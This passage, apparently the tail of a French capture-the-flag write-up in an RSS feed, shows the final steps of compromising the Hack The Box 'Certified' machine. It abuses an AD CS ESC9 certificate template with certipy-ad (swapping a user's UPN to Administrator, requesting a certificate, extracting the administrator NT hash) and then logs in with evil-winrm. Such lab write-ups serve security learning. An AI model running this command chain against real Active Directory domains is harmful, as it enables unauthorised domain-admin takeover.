+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">certipy&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ad&lt;/span> &lt;span class="nx">account&lt;/span> &lt;span class="nx">update&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">username&lt;/span> &lt;span class="s">&amp;#34;management_svc@certified.htb&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">hashes&lt;/span> &lt;span class="nx">a&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">user&lt;/span> &lt;span class="nx">ca_operator&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">upn&lt;/span> &lt;span class="nx">Administrator&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Certipy&lt;/span> &lt;span class="nx">v4&lt;/span>&lt;span class="mf">.8.2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="nx">Oliver&lt;/span> &lt;span class="nf">Lyak&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ly4k&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Updating&lt;/span> &lt;span class="nx">user&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">ca_operator&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">userPrincipalName&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">Administrator&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Successfully&lt;/span> &lt;span class="nx">updated&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">ca_operator&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>Ensuite, nous pouvons demander un certificat d&amp;rsquo;authentification en tant que &lt;em>ca_operator&lt;/em> en utilisant le template vulnérable.&lt;br>
+Les valeurs de ca et template peuvent être trouvées dans le .txt généré ultérieurement.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">11
+&lt;/span>&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="mi">20250313205721_&lt;/span>&lt;span class="nx">Certipy&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Certificate&lt;/span> &lt;span class="nx">Templates&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Template&lt;/span> &lt;span class="nx">Name&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">CertifiedAuthentication&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Display&lt;/span> &lt;span class="nx">Name&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">Certified&lt;/span> &lt;span class="nx">Authentication&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Certificate&lt;/span> &lt;span class="nx">Authorities&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">certified&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">DC01&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">CA&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">certipy&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ad&lt;/span> &lt;span class="nx">req&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">username&lt;/span> &lt;span class="s">&amp;#34;ca_operator@certified.htb&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">hashes&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">target&lt;/span> &lt;span class="s">&amp;#34;10.10.11.41&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">ca&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">DC01&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">CA&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">template&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">CertifiedAuthentication&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Certipy&lt;/span> &lt;span class="nx">v4&lt;/span>&lt;span class="mf">.8.2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="nx">Oliver&lt;/span> &lt;span class="nf">Lyak&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ly4k&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Requesting&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="nx">via&lt;/span> &lt;span class="nx">RPC&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Successfully&lt;/span> &lt;span class="nx">requested&lt;/span> &lt;span class="nx">certificate&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Request&lt;/span> &lt;span class="nx">ID&lt;/span> &lt;span class="nx">is&lt;/span> &lt;span class="mi">7&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Got&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">UPN&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">Administrator&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Certificate&lt;/span> &lt;span class="nx">has&lt;/span> &lt;span class="nx">no&lt;/span> &lt;span class="nx">object&lt;/span> &lt;span class="nx">SID&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Saved&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">private&lt;/span> &lt;span class="nx">key&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pfx&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>Dernièrement, nous pouvons rechanger le &lt;code>userPrincipalName&lt;/code> &lt;em>ca_operator&lt;/em> pour lui même et ensuite obtenir le NT hash d&amp;rsquo;Administrator en utilisant le fichier administrator.pfx généré.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 9
+&lt;/span>&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">certipy&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ad&lt;/span> &lt;span class="nx">account&lt;/span> &lt;span class="nx">update&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">username&lt;/span> &lt;span class="s">&amp;#34;management_svc@certified.htb&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">hashes&lt;/span> &lt;span class="nx">a&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">user&lt;/span> &lt;span class="nx">ca_operator&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">upn&lt;/span> &lt;span class="s">&amp;#34;ca_operator@certified.htb&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">dc&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ip&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Certipy&lt;/span> &lt;span class="nx">v4&lt;/span>&lt;span class="mf">.8.2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="nx">Oliver&lt;/span> &lt;span class="nf">Lyak&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ly4k&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Updating&lt;/span> &lt;span class="nx">user&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">ca_operator&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">userPrincipalName&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">ca_operator&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Successfully&lt;/span> &lt;span class="nx">updated&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">ca_operator&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">certipy&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ad&lt;/span> &lt;span class="nx">auth&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">pfx&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pfx&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">domain&lt;/span> &lt;span class="s">&amp;#34;certified.htb&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Certipy&lt;/span> &lt;span class="nx">v4&lt;/span>&lt;span class="mf">.8.2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="nx">Oliver&lt;/span> &lt;span class="nf">Lyak&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ly4k&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Using&lt;/span> &lt;span class="nx">principal&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">administrator&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">get&lt;/span> &lt;span class="nx">TGT&lt;/span>&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Got&lt;/span> &lt;span class="nx">TGT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Saved&lt;/span> &lt;span class="nx">credential&lt;/span> &lt;span class="nx">cache&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ccache&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">retrieve&lt;/span> &lt;span class="nx">NT&lt;/span> &lt;span class="nx">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Got&lt;/span> &lt;span class="nx">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">a&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>Avec ce hash, nous pouvons récupérer le flag root via evil-winrm.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">evil&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">winrm&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">Administrator&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">H&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Mode&lt;/span> &lt;span class="nx">LastWriteTime&lt;/span> &lt;span class="nx">Length&lt;/span> &lt;span class="nx">Name&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">----&lt;/span> &lt;span class="o">-------------&lt;/span> &lt;span class="o">------&lt;/span> &lt;span class="o">----&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">ar&lt;/span>&lt;span class="o">---&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2025&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">54&lt;/span> &lt;span class="nx">PM&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;h2 id="ressources">Ressources
+&lt;/h2>&lt;blockquote>
+&lt;p>&lt;a class="link" href="https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension" target="_blank" rel="noopener"
+>thehacker.recipes - certificate templates&lt;/a>&lt;/p>&lt;/blockquote></description></item></channel></rss>
